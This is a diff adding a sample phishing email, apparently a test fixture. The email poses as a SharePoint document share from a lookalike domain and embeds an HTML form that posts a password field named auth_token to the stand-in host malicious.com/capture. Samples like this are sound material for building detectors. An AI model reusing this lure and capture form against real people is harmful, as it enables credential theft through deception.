@@ -1,0 +1,5 @@
+Subject: Secure Document Share
+From: SharePoint <noreply@sharepoint-ext-portal.com>
+To: victim@company.com
+
+A document has been shared with you. View the secure document here: <form action='http://malicious.com/capture' method='POST'><input type='password' name='auth_token' /></form>
